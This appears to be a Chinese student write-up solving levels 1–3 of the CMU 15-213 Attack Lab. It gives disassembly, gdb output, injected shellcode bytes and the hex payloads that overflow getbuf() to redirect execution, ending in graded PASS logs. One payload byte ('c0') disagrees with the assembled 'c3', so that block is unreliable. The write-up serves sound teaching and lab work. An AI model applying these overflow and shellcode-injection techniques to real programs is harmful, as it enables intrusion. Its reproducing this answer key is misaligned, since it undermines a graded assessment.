### Level1

首先`objdump -d ctarget.c > ctarget.s`得到程序的汇编代码

直接看漏洞函数`getbuf()`

```
00000000004017a8 <getbuf>:                                   
  4017a8:	48 83 ec 28          	sub    $0x28,%rsp
  4017ac:	48 89 e7             	mov    %rsp,%rdi
  4017af:	e8 8c 02 00 00       	callq  401a40 <Gets>
  4017b4:	b8 01 00 00 00       	mov    $0x1,%eax
  4017b9:	48 83 c4 28          	add    $0x28,%rsp
  4017bd:	c3                   	retq   
  4017be:	90                   	nop
  4017bf:	90                   	nop
```

我们可以看到开辟了`0x28`的空间，那么我们`0x28`的空间后就是`getbuf()`函数作为被调用者需要返回到调用函数的地址。那么我们就可以填满`0x28`后控制程序返回到我们想去的地方。

```
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00 
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00 
00 00 00 00 00 00 00 00
c0 17 40
```

`0x4017c0`为`touch1`函数的返回地址。

```text
linux> ./hex2raw < t1.txt | ./ctarget -q
Cookie: 0x59b997fa
Type string:Touch1!: You called touch1()
Valid solution for level 1 with target ctarget
PASS: Would have posted the following:
	user id	bovik
	course	15213-f15
	lab	attacklab
	result	1:PASS:0xffffffff:ctarget:1:00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 C0 17 40 
```

### Level2

`touch2`函数如下：

```c
void touch2(unsigned val){
    vlevel = 2;
    if (val == cookie){
        printf("Touch2!: You called touch2(0x%.8x)\n", val);
        validate(2);
    } else {
        printf("Misfire: You called touch2(0x%.8x)\n", val);
        fail(2);
    }
    exit(0);
}
```

我们要想成功调用`touch2`函数，不仅要返回到`touch2`，还得让`val==cookie`才能成功，我们知道这里的第一个参数是保存在`rdi`寄存器中，那么我们的cookie值`0x59b997fa`应该保存在`rdi`寄存器中。这里我们利用`shellcode`，将程序溢出`0x28`后返回到我们的`shellcode`中。那么我们的`shellcode`为

```text
mov    $0x59b997fa, %rdi //cookie放入rdi中
pushq  $0x4017ec         //touch2函数地址
retq                    //返回到touch2函数
```

此时我们需要得到它的机器码

```
linux> gcc -c t2.s
linux> objdump t2.o -d
t2.o：     文件格式 elf64-x86-64
Disassembly of section .text:
0000000000000000 <.text>:
   0:	48 c7 c7 fa 97 b9 59 	mov    $0x59b997fa,%rdi
   7:	68 ec 17 40 00       	pushq  $0x4017ec
   c:	c3                   	retq   
```

既然我们的`shellcode`在`rsp`上，那么我们还需要通过`gdb`调试获得`rsp`的地址

```
 RBP  0x55685fe8 —▸ 0x402fa5 ◂— push   0x3a6971 /* 'hqi:' */
 RSP  0x5561dc78 ◂— 0
 RIP  0x4017ac (getbuf+4) ◂— mov    rdi, rsp
```

我们得到`rsp`的地址为`0x5561dc78`

那么我们的最后答案是

```
48 c7 c7 fa 97 b9 59 68
ec 17 40 00 c0 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
78 dc 61 55 00 00 00 00
```

```
linux> ./hex2raw < t2.txt | ./ctarget -q
Cookie: 0x59b997fa
Type string:Touch2!: You called touch2(0x59b997fa)
Valid solution for level 2 with target ctarget
PASS: Would have posted the following:
	user id	bovik
	course	15213-f15
	lab	attacklab
	result	1:PASS:0xffffffff:ctarget:2:48 C7 C7 FA 97 B9 59 68 EC 17 40 00 C3 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 78 DC 61 55 00 00 00 00 
```

### Level3

```c
void touch3(char *sval){
    vlevel = 3;
    if (hexmatch(cookie, sval)){
        printf("Touch3!: You called touch3(\"%s\")\n", sval);
        validate(3);
    } else {
        printf("Misfire: You called touch3(\"%s\")\n", sval);
        fail(3);
    }
    exit(0);
}
int hexmatch(unsigned val, char *sval){
    char cbuf[110];
    char *s = cbuf + random() % 100;
    sprintf(s, "%.8x", val);
    return strncmp(sval, s, 9) == 0;
}
```

这里会将传入的字符串与字符串`59b997fa`，而这个字符串就是我们的cookie，思路就和上一题差不多，这里需要注意的是`hexmatch`函数还有`strncmp`函数，会覆盖`getbuf`栈帧的数据，所以我们选择一个安全的地方放入我们的数据，那么就是在调用`getbuf`函数前的`test`函数的栈中。

我们通过`gdb`调试，在`call getbuf`前下个断点可以看到

```
pwndbg> info r rsp
rsp            0x5561dca8	0x5561dca8
```

那么接下来是我们的汇编代码

```text
movq    $0x5561dca8, %rdi     //把59b997fa字符串放在栈上，再把地址作为参数传给touch3函数
pushq   0x4018fa
ret
```

```
linux> gcc -c t3.s
linux> objdump -d t3.o

Disassembly of section .text:

0000000000000000 <.text>:
   0:   48 c7 c7 a8 dc 61 55    mov    $0x5561dca8,%rdi
   7:   68 fa 18 40 00          pushq  $0x4018fa
   c:   c3                      retq
```

然后得到`59b997fa`字符串的ascii码`35 39 62 39 39 37 66 61`

最后的答案是

```
48 c7 c7 a8 dc 61 55 68      //0x5561dc78			
fa 18 40 00 c3 00 00 00		//0x5561dc80			
00 00 00 00 00 00 00 00		//0x5561dc88			
00 00 00 00 00 00 00 00		//0x5561dc90			
00 00 00 00 00 00 00 00		//0x5561dc98	从0x5561dc78到0x5561dca0为		
78 dc 61 55 00 00 00 00		//0x5561dca0	getbuf函数的栈帧，后面其父函数
35 39 62 39 39 37 66 61		//0x5561dca8	test函数的栈帧	
```

```
linux> ./hex2raw < t3.txt | ./ctarget -q
Cookie: 0x59b997fa
Type string:Touch3!: You called touch3("59b997fa")
Valid solution for level 3 with target ctarget
PASS: Would have posted the following:
	user id	bovik
	course	15213-f15
	lab	attacklab
	result	1:PASS:0xffffffff:ctarget:3:48 C7 C7 A8 DC 61 55 68 FA 18 40 00 C3 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 78 DC 61 55 00 00 00 00 35 39 62 39 39 37 66 61
```

